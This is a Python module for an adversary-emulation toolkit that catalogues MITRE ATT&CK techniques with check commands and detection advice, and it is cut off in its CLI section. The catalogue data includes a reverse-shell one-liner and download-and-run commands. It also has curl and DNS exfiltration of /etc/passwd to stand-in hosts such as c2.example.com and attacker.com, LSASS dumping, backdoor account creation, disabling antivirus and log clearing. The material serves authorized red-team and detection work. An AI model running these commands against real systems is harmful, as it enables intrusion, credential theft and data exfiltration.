"""
Adversary Emulation — MITRE ATT&CK TTPs + Atomic Red Team-style проверки.
Author: idqwixxa

⚠ Только для авторизованного пентеста / red team / CTF.

Возможности:
    - База TTPs по тактикам MITRE ATT&CK (14 тактик)
    - Atomic Red Team-style одна-строчные проверки
    - Рекомендации по детекту (Sysmon, EDR, логи)
    - Экспорт в JSON / Markdown / Navigator layer
    - Фильтр по тактике / платформе / уровню шума
    - Счётчик покрытия по тактикам
"""
import json
import re
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path

from rich.console import Console
from rich.prompt import Prompt, Confirm
from rich.table import Table

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

TTP_DIR = REPORT_DIR / "adversary"
TTP_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Модель
# ===========================================================================

@dataclass
class TTP:
    ttp_id: str               # T1059.001
    name: str                 # PowerShell
    tactic: str               # execution
    platforms: list[str]      # [windows, linux, macos]
    description: str
    check_commands: list[str] = field(default_factory=list)
    detection: list[str] = field(default_factory=list)
    noise: str = "medium"     # low | medium | high
    refs: list[str] = field(default_factory=list)


# ===========================================================================
# База TTPs (по мотивам MITRE ATT&CK + Atomic Red Team)
# ===========================================================================

TACTICS = [
    "reconnaissance", "resource-development", "initial-access",
    "execution", "persistence", "privilege-escalation",
    "defense-evasion", "credential-access", "discovery",
    "lateral-movement", "collection", "command-and-control",
    "exfiltration", "impact",
]


TTPS: list[TTP] = [
    # ---------- EXECUTION ----------
    TTP(
        ttp_id="T1059.001", name="PowerShell",
        tactic="execution", platforms=["windows"],
        description=(
            "Adversaries abuse PowerShell для выполнения команд, "
            "загрузки payload'ов, обхода защиты."
        ),
        check_commands=[
            "powershell -NoP -NonI -W Hidden -Command \"Write-Host 'simulated'\"",
            "powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8000/test.ps1')\"",
            "powershell -enc ZQBjAGgAbwAgACIAdABlAHMAdAAiAA==",
            "powershell -c \"$s=New-Object IO.MemoryStream; Write-Host 'in-memory'\"",
            "powershell -Command \"Get-Process | Select-Object -First 5\"",
        ],
        detection=[
            "Sysmon EventID 1 (ProcessCreate): parent=powershell.exe",
            "ScriptBlockLogging (EventID 4104) для IEX/DownloadString/enc",
            "AMSI logging — блокировка подозрительных скриптов",
            "CommandLine содержит -enc / -ep bypass / -nop / -w hidden",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1059/001/"],
    ),
    TTP(
        ttp_id="T1059.004", name="Unix Shell",
        tactic="execution", platforms=["linux", "macos"],
        description=(
            "Использование /bin/sh, bash, zsh для выполнения "
            "произвольных команд."
        ),
        check_commands=[
            "bash -c 'echo simulated-shell'",
            "sh -c 'whoami; id; hostname; uname -a'",
            "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1  # reverse-shell template",
            "curl -s http://127.0.0.1:8000/script.sh | bash",
            "python3 -c \"import os; os.system('id')\"",
        ],
        detection=[
            "auditd execve hooks (audit.rules: -a always,exit -F arch=b64 -S execve)",
            "Sysmon for Linux (EventID 1)",
            "Bash history + HISTFILE monitoring",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1059/004/"],
    ),
    TTP(
        ttp_id="T1059.006", name="Python",
        tactic="execution", platforms=["linux", "macos", "windows"],
        description="Выполнение команд через Python (popen/os.system/subprocess).",
        check_commands=[
            "python3 -c \"import os; os.system('id')\"",
            "python3 -c \"import subprocess; print(subprocess.run(['id'], capture_output=True).stdout.decode())\"",
            "python3 -c \"__import__('os').system('whoami')\"",
        ],
        detection=[
            "auditd execve для /usr/bin/python3",
            "Обнаружение base64-encoded payload через python -c",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1059/006/"],
    ),

    # ---------- PERSISTENCE ----------
    TTP(
        ttp_id="T1053.005", name="Scheduled Task",
        tactic="persistence", platforms=["windows"],
        description="Планировщик Windows для persist.",
        check_commands=[
            "schtasks /create /tn \"UpdateCheck\" /tr \"calc.exe\" /sc onlogon /f",
            "schtasks /query /fo LIST /v | findstr \"Task To Run\"",
            "schtasks /delete /tn \"UpdateCheck\" /f",
        ],
        detection=[
            "Sysmon EventID 1 schtasks.exe",
            "Security EventID 4698 (scheduled task created)",
            "Мониторинг Task Scheduler Operational Log",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1053/005/"],
    ),
    TTP(
        ttp_id="T1053.003", name="Cron",
        tactic="persistence", platforms=["linux", "macos"],
        description="Cron jobs для persist в Linux.",
        check_commands=[
            "(crontab -l 2>/dev/null; echo '* * * * * /tmp/beacon.sh') | crontab -",
            "crontab -l",
            "cat /etc/crontab",
            "ls -la /etc/cron.*/",
        ],
        detection=[
            "auditd watch /etc/cron*, /var/spool/cron",
            "Мониторинг процессов, запущенных от cron",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1053/003/"],
    ),
    TTP(
        ttp_id="T1547.001", name="Registry Run Keys",
        tactic="persistence", platforms=["windows"],
        description="Autostart через HKLM/HKCU Run.",
        check_commands=[
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d calc.exe /f",
            "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /f",
        ],
        detection=[
            "Sysmon EventID 13 (RegistrySetValue) для Run-ключей",
            "Sysmon EventID 12/13/14 для автозагрузки",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1547/001/"],
    ),
    TTP(
        ttp_id="T1136.001", name="Local Account",
        tactic="persistence", platforms=["windows", "linux"],
        description="Создание локальной учётки для persist.",
        check_commands=[
            "net user backdoor P@ssw0rd! /add",
            "net localgroup Administrators backdoor /add",
            "useradd -m -s /bin/bash backdoor && echo 'backdoor:P@ssw0rd!' | chpasswd",
            "usermod -aG sudo backdoor",
            "net user /delete backdoor",
            "userdel -r backdoor",
        ],
        detection=[
            "Windows EventID 4720 (user created), 4728 (group add)",
            "auditd для /usr/sbin/useradd, /usr/bin/passwd",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1136/001/"],
    ),

    # ---------- PRIVILEGE ESCALATION ----------
    TTP(
        ttp_id="T1548.002", name="Bypass UAC",
        tactic="privilege-escalation", platforms=["windows"],
        description="Обход User Account Control.",
        check_commands=[
            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA",
            "# Если EnableLUA=0 — UAC выключен",
            "whoami /groups | findstr \"S-1-16-12288\"  # High integrity",
        ],
        detection=[
            "Sysmon EventID 1 для fodhelper.exe, eventvwr.exe, sdclt.exe",
            "Мониторинг auto-elevate COM-объектов",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1548/002/"],
    ),
    TTP(
        ttp_id="T1548.003", name="Sudo Caching",
        tactic="privilege-escalation", platforms=["linux", "macos"],
        description="Эксплуатация sudo без пароля.",
        check_commands=[
            "sudo -n -l 2>/dev/null",
            "sudo -l",
            "# GTFOBins: https://gtfobins.github.io/",
            "cat /etc/sudoers 2>/dev/null",
        ],
        detection=[
            "auditd для /usr/bin/sudo",
            "Мониторинг sudoers NOPASSWD entries",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1548/003/"],
    ),
    TTP(
        ttp_id="T1068", name="Exploit for Privilege Escalation",
        tactic="privilege-escalation", platforms=["windows", "linux"],
        description="Эксплуатация уязвимости ядра / сервиса для privesc.",
        check_commands=[
            "uname -a  # проверить версию ядра",
            "cat /etc/os-release",
            "# Linux: CVE-2021-4034 (PwnKit), CVE-2022-0847 (Dirty Pipe)",
            "# Windows: CVE-2020-0787, CVE-2021-1732",
            "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"",
        ],
        detection=[
            "Sysmon EventID 1 для нестандартных процессов от SYSTEM",
            "Kernel panic / crash dumps",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1068/"],
    ),

    # ---------- DEFENSE EVASION ----------
    TTP(
        ttp_id="T1562.001", name="Disable or Modify Tools",
        tactic="defense-evasion", platforms=["windows", "linux"],
        description="Отключение AV / EDR / firewall.",
        check_commands=[
            "sc stop WinDefend  # Windows Defender",
            "net stop \"Windows Defender Antivirus Service\"",
            "systemctl stop firewalld  # Linux",
            "ufw disable  # Ubuntu",
            "Set-MpPreference -DisableRealtimeMonitoring $true  # PS",
        ],
        detection=[
            "Windows EventID 7036 (service stopped)",
            "Sysmon EventID 1 sc.exe / net.exe",
            "Алерты на изменение реестра Defender",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1562/001/"],
    ),
    TTP(
        ttp_id="T1070.004", name="File Deletion",
        tactic="defense-evasion", platforms=["windows", "linux"],
        description="Удаление следов (логов, инструментов).",
        check_commands=[
            "del /f /q C:\\Temp\\beacon.exe",
            "shred -u /tmp/beacon.sh",
            "wevtutil cl Security  # Windows, очистка логов",
            "rm -f /var/log/auth.log.*  # Linux",
        ],
        detection=[
            "Sysmon EventID 23 (FileDelete)",
            "Windows EventID 1102 (audit log cleared)",
            "auditd unlink hooks",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1070/004/"],
    ),
    TTP(
        ttp_id="T1027", name="Obfuscated Files or Information",
        tactic="defense-evasion", platforms=["windows", "linux", "macos"],
        description="Обфускация payload'ов (base64, шифрование, упаковка).",
        check_commands=[
            "echo 'aWQKd2hvYW1pCg==' | base64 -d",
            "certutil -decode payload.b64 payload.exe",
            "openssl enc -aes-256-cbc -in payload -out payload.enc -k secret",
            "gzip -c payload | base64 -w0",
        ],
        detection=[
            "Sysmon EventID 1 для certutil.exe -decode",
            "Обнаружение base64-строк длиной >100 символов в командной строке",
            "YARA-правила для упакованных PE",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1027/"],
    ),

    # ---------- CREDENTIAL ACCESS ----------
    TTP(
        ttp_id="T1003.001", name="LSASS Memory",
        tactic="credential-access", platforms=["windows"],
        description="Дамп LSASS для кражи хешей / Kerberos-тикетов.",
        check_commands=[
            "procdump.exe -ma lsass.exe lsass.dmp",
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Temp\\lsass.dmp full",
            "# Mimikatz (только в lab): sekurlsa::logonpasswords",
            "# Далее: impacket-secretsdump -sam sam -system system LOCAL",
        ],
        detection=[
            "Sysmon EventID 10 (ProcessAccess) с target=lsass.exe",
            "Windows Defender Credential Guard",
            "EDR-правила на доступ к lsass.exe",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1003/001/"],
    ),
    TTP(
        ttp_id="T1003.008", name="/etc/passwd и /etc/shadow",
        tactic="credential-access", platforms=["linux", "macos"],
        description="Чтение хешей из /etc/shadow.",
        check_commands=[
            "cat /etc/passwd",
            "sudo cat /etc/shadow",
            "unshadow /etc/passwd /etc/shadow > hashes.txt",
            "john hashes.txt  # cracking",
        ],
        detection=[
            "auditd для /etc/shadow (read)",
            "File Integrity Monitoring (AIDE, Tripwire)",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1003/008/"],
    ),
    TTP(
        ttp_id="T1110.001", name="Password Guessing",
        tactic="credential-access", platforms=["windows", "linux"],
        description="Перебор паролей (brute-force).",
        check_commands=[
            "hydra -l admin -P pass.txt ssh://target",
            "medusa -h target -u admin -P pass.txt -M ssh",
            "crackmapexec smb target -u users.txt -p pass.txt",
            "patator ssh_login host=target user=admin password=FILE0 0=pass.txt",
        ],
        detection=[
            "Мониторинг failed logon (Windows 4625 / Linux auth.log)",
            "Fail2ban / CrowdSec",
            "Алерты на >N failed attempts за минуту",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1110/001/"],
    ),
    TTP(
        ttp_id="T1558.003", name="Kerberoasting",
        tactic="credential-access", platforms=["windows"],
        description="Запрос Kerberos TGS для оффлайн-крэка.",
        check_commands=[
            "impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.0.0.1 -request",
            "impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.0.0.1 -request -outputfile kerb.txt",
            "hashcat -m 13100 kerb.txt wordlist.txt",
            "Rubeus.exe kerberoast /outfile:hashes.txt",
        ],
        detection=[
            "Windows EventID 4769 (TGS requested) для не-machines",
            "AES-типы вместо RC4 (если включено)",
            "Аномальное количество TGS от одной учётки",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1558/003/"],
    ),
    TTP(
        ttp_id="T1552.001", name="Credentials in Files",
        tactic="credential-access", platforms=["windows", "linux", "macos"],
        description="Поиск паролей в конфигах, скриптах, истории.",
        check_commands=[
            "grep -rEi \"(password|passwd|secret|api[_-]?key)\" /home /var/www /opt 2>/dev/null",
            "cat ~/.bash_history | grep -Ei \"pass|ssh|curl.*-u\"",
            "cat ~/.zsh_history 2>/dev/null",
            "find / -name '*.env' -o -name '*.pgpass' -o -name '.netrc' 2>/dev/null",
            "Get-ChildItem -Path C:\\ -Recurse -Include *.config,*.xml,*.json -ErrorAction SilentlyContinue | Select-String -Pattern 'password'",
        ],
        detection=[
            "Sysmon EventID 1 для grep, findstr",
            "DLP-правила на массовое чтение .config / .env",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1552/001/"],
    ),

    # ---------- DISCOVERY ----------
    TTP(
        ttp_id="T1082", name="System Information Discovery",
        tactic="discovery", platforms=["windows", "linux", "macos"],
        description="Сбор информации о системе.",
        check_commands=[
            "whoami /all",
            "systeminfo",
            "wmic os get Caption,Version,BuildNumber",
            "uname -a; cat /etc/os-release",
            "lscpu; free -h; df -h",
        ],
        detection=[
            "Sysmon EventID 1 для systeminfo.exe, wmic.exe",
            "auditd для /bin/uname, /usr/bin/lscpu",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1082/"],
    ),
    TTP(
        ttp_id="T1018", name="Remote System Discovery",
        tactic="discovery", platforms=["windows", "linux"],
        description="Обнаружение других хостов в сети.",
        check_commands=[
            "net view /domain",
            "nltest /dclist:domain.local",
            "arp -a",
            "nmap -sn 192.168.1.0/24",
            "for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i >/dev/null 2>&1 && echo 192.168.1.$i; done",
        ],
        detection=[
            "Sysmon EventID 1 для nltest.exe, net.exe",
            "Обнаружение ARP-сканов (большое кол-во ARP)",
            "Мониторинг ICMP flood",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1018/"],
    ),
    TTP(
        ttp_id="T1083", name="File and Directory Discovery",
        tactic="discovery", platforms=["windows", "linux", "macos"],
        description="Поиск файлов и директорий.",
        check_commands=[
            "dir C:\\Users\\ /s /b /a",
            "find / -perm -u=s -type f 2>/dev/null  # SUID",
            "find / -writable -type d 2>/dev/null",
            "ls -la /home/*/",
        ],
        detection=[
            "Sysmon EventID 1 для dir, find",
            "Обнаружение рекурсивного чтения больших деревьев",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1083/"],
    ),
    TTP(
        ttp_id="T1046", name="Network Service Discovery",
        tactic="discovery", platforms=["windows", "linux", "macos"],
        description="Скан портов и сервисов.",
        check_commands=[
            "nmap -sS -p- 192.168.1.0/24",
            "nmap -sV -sC target",
            "Test-NetConnection -ComputerName target -Port 445  # PS",
        ],
        detection=[
            "Сетевые IDS/IPS (Suricata, Zeek)",
            "Обнаружение SYN scan / FIN scan",
            "Алерты на сканирование >100 портов за секунду",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1046/"],
    ),

    # ---------- LATERAL MOVEMENT ----------
    TTP(
        ttp_id="T1021.001", name="Remote Desktop Protocol",
        tactic="lateral-movement", platforms=["windows"],
        description="RDP для lateral movement.",
        check_commands=[
            "mstsc /v:target",
            "xfreerdp /u:user /p:pass /v:target /cert-ignore",
            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
            "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes",
        ],
        detection=[
            "Windows EventID 4624 (LogonType=10) для RDP",
            "Мониторинг RDP-портов с внешних адресов",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1021/001/"],
    ),
    TTP(
        ttp_id="T1021.002", name="SMB/Windows Admin Shares",
        tactic="lateral-movement", platforms=["windows"],
        description="Lateral movement через SMB / admin shares.",
        check_commands=[
            "net use \\\\target\\C$ /user:domain\\admin pass",
            "copy beacon.exe \\\\target\\C$\\Windows\\Temp\\",
            "wmic /node:target process call create \"C:\\Windows\\Temp\\beacon.exe\"",
            "psexec.py domain/admin:pass@target cmd.exe",
        ],
        detection=[
            "Sysmon EventID 3 (NetworkConnect) для 445",
            "Windows EventID 5140 (share accessed)",
            "Обнаружение admin$ / C$ доступов от нестандартных учёток",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1021/002/"],
    ),
    TTP(
        ttp_id="T1021.004", name="SSH",
        tactic="lateral-movement", platforms=["linux", "macos"],
        description="Lateral через SSH (ключи, пароли, agent forwarding).",
        check_commands=[
            "ssh user@target",
            "ssh -i stolen_key user@target",
            "ssh -A user@jump_host  # agent forwarding",
            "scp payload.sh user@target:/tmp/",
        ],
        detection=[
            "auditd для /usr/bin/ssh",
            "auth.log failed/success logins",
            "Обнаружение brute-force SSH",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1021/004/"],
    ),
    TTP(
        ttp_id="T1550.002", name="Pass the Hash",
        tactic="lateral-movement", platforms=["windows"],
        description="Аутентификация через NTLM-хеш без пароля.",
        check_commands=[
            "crackmapexec smb target -u admin -H <NThash>",
            "psexec.py -hashes :<NThash> admin@target",
            "wmiexec.py -hashes :<NThash> admin@target",
            "impacket-smbexec -hashes :<NThash> admin@target",
        ],
        detection=[
            "Windows EventID 4624 (LogonType=3, NTLM)",
            "Обнаружение необычных NTLM-логинов",
            "Отключить NTLM где можно",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1550/002/"],
    ),

    # ---------- COLLECTION ----------
    TTP(
        ttp_id="T1005", name="Data from Local System",
        tactic="collection", platforms=["windows", "linux", "macos"],
        description="Сбор данных с локальной системы.",
        check_commands=[
            "find / -type f \\( -name '*.pdf' -o -name '*.docx' -o -name '*.xlsx' \\) 2>/dev/null",
            "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf -ErrorAction SilentlyContinue",
            "tar czf /tmp/collected.tgz /home/*/Documents/",
        ],
        detection=[
            "DLP-правила на массовое чтение документов",
            "Sysmon EventID 1 для tar, 7z, zip",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1005/"],
    ),
    TTP(
        ttp_id="T1056.001", name="Keylogging",
        tactic="collection", platforms=["windows", "linux"],
        description="Запись нажатий клавиш.",
        check_commands=[
            "# Linux (только на своей системе!)",
            "sudo showkey -s",
            "# Windows: SetWindowsHookEx (PS/API)",
            "# Mimikatz: misc::skeleton",
            "# pynput example: from pynput import keyboard",
        ],
        detection=[
            "Sysmon EventID 1 для подозрительных библиотек",
            "API monitoring: SetWindowsHookEx",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1056/001/"],
    ),

    # ---------- COMMAND AND CONTROL ----------
    TTP(
        ttp_id="T1071.001", name="Web Protocols",
        tactic="command-and-control", platforms=["windows", "linux", "macos"],
        description="C2 через HTTP/HTTPS.",
        check_commands=[
            "curl -X POST -d 'beacon=1' http://c2.example.com/check",
            "python3 -c \"import requests; requests.post('http://c2.example.com/beacon', json={'id':'bot1'})\"",
        ],
        detection=[
            "Обнаружение периодических HTTP-запросов (beaconing)",
            "JA3-fingerprint для нестандартных TLS-клиентов",
            "Мониторинг необычных User-Agent",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1071/001/"],
    ),
    TTP(
        ttp_id="T1071.004", name="DNS",
        tactic="command-and-control", platforms=["windows", "linux"],
        description="C2 через DNS (DNS tunneling).",
        check_commands=[
            "nslookup beacon.attacker.com",
            "dig @8.8.8.8 +short data.attacker.com",
            "# DNS exfil через длинные TXT-запросы",
            "for i in $(cat /tmp/secret); do dig +short $i.exfil.attacker.com; done",
        ],
        detection=[
            "Мониторинг большого количества NXDOMAIN",
            "DNS-запросы с длинными subdomain (base64)",
            "Обнаружение tunneling (dnscat2, iodine)",
        ],
        noise="low",
        refs=["https://attack.mitre.org/techniques/T1071/004/"],
    ),
    TTP(
        ttp_id="T1573.002", name="Asymmetric Cryptography",
        tactic="command-and-control", platforms=["windows", "linux", "macos"],
        description="Шифрованный C2 канал (TLS, SSH).",
        check_commands=[
            "# TLS C2 — просто https-соединение",
            "curl https://c2.example.com/beacon -d 'data' -k",
            "# SSH tunnel",
            "ssh -L 8080:internal:80 user@c2.example.com -N -f",
        ],
        detection=[
            "JA3/JA3S fingerprints",
            "Обнаружение self-signed сертификатов",
            "Аномальные TLS-сессии (нестандартные ports)",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1573/002/"],
    ),

    # ---------- EXFILTRATION ----------
    TTP(
        ttp_id="T1041", name="Exfiltration Over C2 Channel",
        tactic="exfiltration", platforms=["windows", "linux", "macos"],
        description="Отправка данных через тот же C2.",
        check_commands=[
            "curl -F 'file=@/etc/passwd' http://c2.example.com/upload",
            "Invoke-WebRequest -Uri http://c2.example.com/upload -Method Post -InFile secret.docx",
        ],
        detection=[
            "DLP на исходящий трафик",
            "Обнаружение необычно больших POST-запросов",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1041/"],
    ),
    TTP(
        ttp_id="T1048.003", name="Exfiltration Over Unencrypted Protocol",
        tactic="exfiltration", platforms=["windows", "linux"],
        description="Exfil через DNS/FTP/HTTP без шифрования.",
        check_commands=[
            "base64 -w0 /etc/passwd | while read line; do dig +short $line.exfil.attacker.com; done",
            "ftp -n attacker.com <<< 'put secret.txt'",
            "tftp attacker.com -c put secret.txt",
        ],
        detection=[
            "Мониторинг FTP/TFTP исходящих",
            "Аномальные DNS-запросы",
        ],
        noise="medium",
        refs=["https://attack.mitre.org/techniques/T1048/003/"],
    ),

    # ---------- IMPACT ----------
    TTP(
        ttp_id="T1486", name="Data Encrypted for Impact",
        tactic="impact", platforms=["windows", "linux", "macos"],
        description="Ransomware — шифрование данных.",
        check_commands=[
            "# 🚨 НЕ ЗАПУСКАТЬ НА PRODUCTION",
            "# Simulation: openssl enc -aes-256-cbc -in test.txt -out test.txt.enc",
            "# Использовать только на /tmp/test в лаборатории",
            "openssl enc -aes-256-cbc -salt -in /tmp/lab.txt -out /tmp/lab.txt.enc -k testkey",
            "openssl enc -d -aes-256-cbc -in /tmp/lab.txt.enc -out /tmp/lab.txt.dec -k testkey",
        ],
        detection=[
            "Обнаружение массового переименования файлов",
            "Shadow Copy deletion (vssadmin)",
            "Аномальная нагрузка на диск",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1486/"],
    ),
    TTP(
        ttp_id="T1489", name="Service Stop",
        tactic="impact", platforms=["windows", "linux"],
        description="Остановка критичных сервисов (DB, web).",
        check_commands=[
            "sc stop MSSQLSERVER  # Windows",
            "net stop \"SQL Server (MSSQLSERVER)\"",
            "systemctl stop nginx mysql postgresql  # Linux",
            "killall -9 apache2",
        ],
        detection=[
            "Windows EventID 7036 (service stopped)",
            "auditd для systemctl / kill",
        ],
        noise="high",
        refs=["https://attack.mitre.org/techniques/T1489/"],
    ),
]


# ===========================================================================
# Фильтрация / печать
# ===========================================================================

def filter_ttps(tactic: str | None = None,
                platform: str | None = None,
                noise: str | None = None) -> list[TTP]:
    out = TTPS
    if tactic:
        out = [t for t in out if t.tactic == tactic]
    if platform:
        out = [t for t in out if platform in t.platforms]
    if noise:
        out = [t for t in out if t.noise == noise]
    return out


def _noise_style(noise: str) -> str:
    return {
        "low": "green",
        "medium": "yellow",
        "high": "red",
    }.get(noise, "white")


def show_ttps(ttps: list[TTP], title: str = "TTPs") -> None:
    if not ttps:
        console.print("[yellow]Ничего не найдено.[/yellow]")
        return
    table = Table(title=f"⚔  {title} ({len(ttps)})")
    table.add_column("TTP ID", style="cyan", width=12)
    table.add_column("Name", style="white", max_width=30)
    table.add_column("Tactic", style="magenta", width=20)
    table.add_column("Platforms", style="dim", max_width=18)
    table.add_column("Noise", width=7)
    for t in ttps:
        sty = _noise_style(t.noise)
        table.add_row(
            t.ttp_id,
            t.name,
            t.tactic,
            ",".join(t.platforms)[:18],
            f"[{sty}]{t.noise}[/{sty}]",
        )
    console.print(table)


def show_ttp_detail(ttp_id: str) -> None:
    """Показать TTP с check_commands и detection."""
    t = next((x for x in TTPS if x.ttp_id == ttp_id), None)
    if not t:
        console.print(f"[red]TTP {ttp_id} не найден.[/red]")
        return

    console.print(f"\n[bold cyan]{t.ttp_id} — {t.name}[/bold cyan]")
    console.print(f"[magenta]Tactic:[/magenta] {t.tactic}  "
                  f"[magenta]Platforms:[/magenta] {', '.join(t.platforms)}  "
                  f"[magenta]Noise:[/magenta] "
                  f"[{_noise_style(t.noise)}]{t.noise}[/{_noise_style(t.noise)}]")
    console.print(f"\n[white]{t.description}[/white]\n")

    if t.check_commands:
        table = Table(title="⚡ Atomic-style check commands",
                      show_header=False, border_style="dim")
        table.add_column("Command")
        for cmd in t.check_commands:
            for line in cmd.split("\n"):
                table.add_row(f"[green]{line}[/green]")
        console.print(table)

    if t.detection:
        console.print("\n[bold yellow]🛡  Detection:[/bold yellow]")
        for d in t.detection:
            console.print(f"  • {d}")

    if t.refs:
        console.print("\n[dim]References:[/dim]")
        for r in t.refs:
            console.print(f"  [cyan]{r}[/cyan]")


def show_tactics_summary() -> None:
    table = Table(title="📊 Покрытие по тактикам")
    table.add_column("Tactic", style="cyan")
    table.add_column("TTPs", width=6)
    table.add_column("Low", width=5)
    table.add_column("Med", width=5)
    table.add_column("High", width=5)
    for tactic in TACTICS:
        ttps = [t for t in TTPS if t.tactic == tactic]
        if not ttps:
            continue
        low = sum(1 for t in ttps if t.noise == "low")
        med = sum(1 for t in ttps if t.noise == "medium")
        high = sum(1 for t in ttps if t.noise == "high")
        table.add_row(tactic, str(len(ttps)), str(low), str(med), str(high))
    console.print(table)


# ===========================================================================
# Экспорт
# ===========================================================================

def export_json(ttps: list[TTP], path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(TTP_DIR / f"ttps_{ts}.json")
    try:
        Path(path).write_text(
            json.dumps([asdict(t) for t in ttps], indent=2,
                       ensure_ascii=False),
            encoding="utf-8",
        )
        console.print(f"[green]✓ JSON: {path}[/green]")
        return Path(path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


def export_markdown(ttps: list[TTP], path: str | None = None) -> Path | None:
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(TTP_DIR / f"ttps_{ts}.md")
    lines = ["# Adversary Emulation Playbook\n",
             f"_Сгенерировано: {datetime.now().strftime('%Y-%m-%d %H:%M')}_\n",
             f"Всего TTPs: {len(ttps)}\n", "---\n"]
    for t in ttps:
        lines.append(f"## {t.ttp_id} — {t.name}\n")
        lines.append(f"**Tactic:** {t.tactic}  ")
        lines.append(f"**Platforms:** {', '.join(t.platforms)}  ")
        lines.append(f"**Noise:** {t.noise}\n")
        lines.append(f"{t.description}\n")
        if t.check_commands:
            lines.append("### Check commands\n```bash")
            lines.append("\n".join(t.check_commands))
            lines.append("```\n")
        if t.detection:
            lines.append("### Detection\n")
            for d in t.detection:
                lines.append(f"- {d}")
            lines.append("")
    try:
        Path(path).write_text("\n".join(lines), encoding="utf-8")
        console.print(f"[green]✓ Markdown: {path}[/green]")
        return Path(path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


def export_navigator_layer(ttps: list[TTP],
                            path: str | None = None) -> Path | None:
    """Экспорт в MITRE Navigator Layer JSON."""
    if not path:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = str(TTP_DIR / f"navigator_layer_{ts}.json")

    layer = {
        "name": "CyberSec Toolkit — Adversary Emulation",
        "versions": {"attack": "14", "navigator": "4.9.0", "layer": "4.5"},
        "domain": "enterprise-attack",
        "description": f"Сгенерировано {datetime.now().isoformat()}",
        "filters": {"platforms": ["Windows", "Linux", "macOS"]},
        "sorting": 0,
        "layout": {"layout": "side", "showID": True, "showName": True},
        "hideDisabled": False,
        "techniques": [
            {
                "techniqueID": t.ttp_id,
                "tactic": t.tactic,
                "color": {"low": "#00ff9c", "medium": "#ffd23f",
                          "high": "#ff4040"}.get(t.noise, "#888"),
                "comment": t.description,
                "enabled": True,
                "metadata": [{"name": "noise", "value": t.noise}],
            }
            for t in ttps
        ],
        "gradient": {"colors": ["#00ff9c", "#ffd23f", "#ff4040"],
                     "minValue": 0, "maxValue": 100},
        "legendItems": [],
        "showTacticRowBackground": False,
        "tacticRowBackground": "#dddddd",
        "selectTechniquesAcrossTactics": True,
        "selectSubtechniquesWithParent": False,
    }
    try:
        Path(path).write_text(json.dumps(layer, indent=2),
                              encoding="utf-8")
        console.print(f"[green]✓ Navigator layer: {path}[/green]")
        console.print("[cyan]Импорт: https://mitre-attack.github.io/attack-navigator/[/cyan]")
        return Path(path)
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")
        return None


# ===========================================================================
# CLI
# ===========================================================================

def cli_list() -> None:
    show_ttps(TTPS)


def cli_by_tactic(tactic: str) -> None:
    ttps = filter_ttps(tactic=tactic)
